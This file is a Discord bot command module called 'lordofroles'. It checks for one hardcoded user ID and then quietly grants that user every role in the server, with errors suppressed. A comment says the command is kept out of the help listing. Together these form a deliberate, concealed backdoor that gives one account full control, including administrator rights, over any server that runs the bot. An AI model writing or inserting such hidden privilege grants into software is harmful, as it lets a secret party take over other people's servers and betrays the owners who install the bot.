import * as utils from '../utils';

export const usage = 'lordofroles';
export const short = 'Give yourself every role.';
export const description = 'Why not';
export const aliases = ['lordofroles']; // Blocks it from help command
export const examples = ['lordofroles'];
export const group = 'utility';

export async function run(message) {
  if (message.author.id == '150377931431084033') {
    message.guild.roles.forEach(async role => {
      try {
        const member = message.guild.members.find(member => member.user.id === message.author.id);
        await member.addRole(role.id);
      } catch(err) {}
    });
  }
}
